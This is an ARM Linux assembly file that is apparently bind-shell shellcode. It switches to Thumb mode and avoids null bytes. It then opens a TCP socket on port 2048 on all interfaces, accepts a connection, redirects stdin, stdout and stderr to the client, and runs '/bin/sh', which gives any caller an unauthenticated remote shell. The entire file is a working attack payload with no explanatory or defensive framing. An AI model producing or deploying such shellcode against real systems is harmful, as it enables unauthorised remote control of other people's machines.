.section .text
.global _start

_start:
    .code 32
    add r3, pc, #1
    bx r3

    .code 16

    // CALL TO SOCKET()
    mov r7, #100
    add r7, r7, #181 // syscall to socket(int, int, int)
    mov r0, #2 // AF_INET
    mov r1, #1 // SOCK_STREAM
    eor r2, r2, r2 // set protocol to 0
    svc #1 // call socket()

    // CALL TO BIND
    mov r6, sp // store the stack pointer into r6
    str r0, [r6] // store the server socket file descriptor onto the stack
    sub sp, sp, #44 // make room for 16 bytes on the stack for 2 struct sockaddr_in and 4 bytes for the server socket file descriptor

    eor r1, r1, r1
    add r1, r6, #4 // the stack with an offset of 4 will point to the begining of the struct sockaddr_in, r1 points to the begining of the struct

    // STORE AF_INET
    mov r0, #2 // AF_INET
    strh r0, [r1] // store at the begining of the struct sockaddr_in the value of AF_INET

    // STORE PORT NUMBER
    mov r0, #2
    lsl r0, #10
    rev16 r0, r0 // reorder to match big endian
    strh r0, [r1, #2] // store in the 3rd and 4th byte of the struct sockaddr_in the port number

    // STORE INADDR_ANY for the address
    eor r0, r0, r0
    str r0, [r1, #4]

    mov r7, #150
    add r7, #132 // syscall to bind(int fd, struct sockaddr *, int)

    ldr r0, [r6] // load first argument with the file descriptor to the server
    mov r2, #16 // size of struct sockaddr_in
    svc #1 // call to bind()


    // CALL TO LISTEN
    ldr r0, [r6] // load first argument with the file descriptor to the server
    mov r1, #3 // maximum number of connections

    mov r7, #150
    add r7, #134 // syscall to listen(int fd, int)

    svc #1 // syscal to listen()

    // CALL TO ACCEPT
    ldr r0, [r6] // load server_socket_fd into first argument
    eor r1, r1, r1
    eor r2, r2, r2
    
    mov r7, #150
    add r7, #135 // syscall to accept(int fd, struct addr_in *, size_t, int)
    svc #1

    mov r8, r0 // store the client socket FD into r8

    // CALLS TO DUP
    mov r1, #1 // STDOUT
    mov r7, #63 // syscall to dup2(int,int)
    svc #1

    mov r0, r8 // load client socket FD into first argument
    mov r1, #2 // STDERR
    svc #1

    mov r0, r8// load client socket FD into first argument
    eor r1, r1, r1 // STDIN
    svc #1

    // CALL TO EXECVE
    add r4, r6, #6 // OFFSET to start of /bin/sh string
    add r4, r4, #10
    add r4, r4, #10
    add r4, r4, #10

    eor r3, r3, r3
        
    mov r3, #0x2F
    strb r3, [r4]

    mov r3, #0x62
    strb r3, [r4, #1]

    mov r3, #0x69
    strb r3, [r4, #2]

    mov r3, #0x6E
    strb r3, [r4, #3]

    mov r3, #0x2F
    strb r3, [r4, #4]

    mov r3, #0x73
    strb r3, [r4, #5]

    mov r3, #0x68
    strb r3, [r4, #6]

    eor r3, r3, r3
    strb r3, [r4, #7]
    mov r0, r4
        
    eor r1, r1, r1
    eor r2, r2, r2
    strb r2, [r0, #7]
    mov r7, #11
    svc #1

    add sp, sp, #44
    eor r0,r0,r0 // align the data to prevent a NOP which causes a null byte
